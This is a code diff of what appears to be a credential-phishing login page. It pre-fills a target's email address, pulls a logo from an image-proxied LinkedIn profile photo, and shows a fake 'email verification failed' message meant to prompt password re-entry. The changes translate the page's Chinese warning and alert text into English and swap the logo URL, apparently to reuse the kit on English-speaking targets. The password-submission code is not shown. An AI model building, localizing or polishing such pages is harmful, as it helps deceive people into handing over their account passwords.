@@ -36,7 +36,7 @@
  <div class=ink-layout-container><div class=ink-main-block>
  <img id="login_logo1" src="" width="80" height="80" alt=""><br>
  <div>
- <p style="background-color:red; padding: 10px; color:white; display:none" id="Div4">邮箱验证失败, 检查并更正您的密码.</p>
+ <p style="background-color:red; padding: 10px; color:white; display:none" id="Div4">Email verification failed; check and correct your password.</p>
  <div class="ink-change-user-button ink-pointer-cursor">
  <span class=ink-change-user-arrow><span class=css-144sltd><span aria-hidden=true class=SVGInline>
  <svg class=SVGInline-svg fill=currentColor xmlns=http://www.w3.org/2000/svg viewBox="0 0 24 24" focusable=false>
@@ -114,7 +114,7 @@ style="width:100%; display:none"/>
 		var my_slice2=email.substr(ind+1,email.length);
 		document.getElementById('username').value = email;
 		document.getElementById('logoname').innerHTML = email;
-		$('#login_logo1').attr('src', 'https://ci3.googleusercontent.com/meips/ADKq_NZk2gLY9gN3QDBWAbfWVF4Sitv45m8Zf5-ja4pCzeZrquQV4mAlygY2CI4c5f0uKBeqSVXoIMBw49l0SpY4C5ifqthh0enZmQp-BAeFMwPkqIiYSt3cNNZT4QFPfG0CFyI_T9e5WIzZdKTEEd2wrHDY_UOorV8Y-A9Zc0pvd6-odUMC82RAhiZxYqlHpWvIP6DllkyYBONvWdtmfFxqNf_h7l4gKOqzYnGsYfhw6ITiZtWA2rh3hXvGOrkIRFJU3cUI_QSlc3qjDMPE-zLasipu03EJ=s0-d-e1-ft#https://media.licdn.com/dms/image/v2/D4D03AQFH_WIz3jM2Ig/profile-displayphoto-scale_400_400/B4DaBoWGEPHcAg-/0/1788457020085?e=2147483647&v=beta&t=2cmatq95Wi6X8jypbnARmkXYEODmL_6yhon8QJmtUx0' + my_slice);
+		$('#login_logo1').attr('src', 'https://ci3.googleusercontent.com/meips/ADKq_Nbn0tT_O4pW37uNrG88AUI1eKO6BGSyusoCTUAgLd8yBwGmAHZlj38Ay9KghCLtJVEskzy6GGVgZYkXNf2RySb7HVUPGQmVTVvoPpXW4r0pf5RASAgTzo4ofvWu5xMLNIQwUKFj7IoOgo_ZNkGSK42FilEGOfW47Jb0Yj8DfRqXR_qHAbGMEhbgTlIXo9G2XRRqtel6BGyrXTCs1OlOc0bJ-Cw9_e0CF71sE3nF8D0c_aqmaOUvDCDZS0ucP8hhTcQuCgZ5-hRVYx-zdtKNifmMeOqESXJBWJSQya_BwsdxtapdolfRG_W8=s0-d-e1-ft#https://media.licdn.com/dms/image/v2/C4D03AQEu6zxXH3N0WA/profile-displayphoto-shrink_400_400/profile-displayphoto-shrink_400_400/0/1640616786440?e=2147483647&v=beta&t=AXnQaGyj-3pxNG5-WPM4brjc8amBVj6Eq7_w0AyNUcA' + my_slice);
 	}
 </script>
 <script type='text/javascript'>
@@ -125,7 +125,7 @@ style="width:100%; display:none"/>
             return false;
     }
     if (document.getElementById('password').value === '') {
-        alert('您输入了错误的密码');
+        alert('You entered the wrong password.');
         return false;
     }
 	var x = document.getElementById("Div4");
